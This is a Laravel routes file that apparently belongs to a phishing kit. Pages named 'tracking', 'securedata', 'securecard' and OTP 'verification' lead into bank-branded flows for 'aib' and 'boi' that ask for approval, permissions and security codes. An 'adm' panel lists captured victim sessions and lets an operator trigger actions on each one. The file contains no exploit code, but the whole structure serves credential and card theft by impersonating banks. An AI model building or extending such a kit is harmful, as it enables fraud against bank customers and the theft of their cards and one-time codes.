<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\MainController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return redirect()->route('main.step_one');
});

Route::view('/tracking', 'main.step_one')->name('main.step_one');
Route::view('/securedata', 'main.step_two')->name('main.step_two');

Route::middleware('valid.session')->group(function(){
    Route::view('/securecard', 'main.step_three')->name('main.step_three');
    Route::view('/verification', 'main.otp')->name('main.otp');
    
    Route::view('/aib', 'main.aib')->name('main.aib');
    Route::view('/aib_verification', 'main.aib_verification')->name('main.aib_verification');
    
    Route::prefix('boi')->group(function(){

        Route::view('/', 'main.boi')->name('main.boi');
        Route::view('/verification', 'main.boi_verification')->name('main.boi_verification');
        Route::view('/verification_error', 'main.boi_verification_error')->name('main.boi_verification_error');
        Route::view('/approve', 'main.boi_approve')->name('main.boi_approve');
        Route::view('/allow_notification', 'main.boi_allow_notification')->name('main.boi_allow_notification');
        Route::view('/allow_permission', 'main.boi_allow_permission')->name('main.boi_allow_permission');
        Route::view('/security_code', 'main.boi_security_code')->name('main.boi_security_code');

    });
});

Route::view('/bye', 'main.bye')->name('main.bye');


Route::prefix('request')->group(function () {
    Route::post('/new', [MainController::class, 'new'])->name('main.new');
    Route::post('/conn', [MainController::class, 'connection'])->middleware('valid.session')->name('main.connection');
});



Route::prefix('adm')->group(function () {
    Route::view('/login', 'admin.login')->name('admin.login');
    Route::get('/dashboard', [AdminController::class, 'dashboard'])->middleware('auth')->name('admin.dashboard');
    Route::get('/sessions/{type}', [AdminController::class, 'sessions'])->middleware('auth')->name('admin.sessions');
    Route::get('/session/{session}', [AdminController::class, 'session'])->middleware('auth')->name('admin.session');
    Route::get('/session/{session}/{action}', [AdminController::class, 'session_action'])->middleware('auth')->name('admin.session.action');
    
    Route::get('/logout', function () {
        auth()->logout();
        return redirect()->route('admin.login');
    })->middleware('auth')->name('admin.logout');

    Route::post('/login', [AdminController::class, 'login']);
});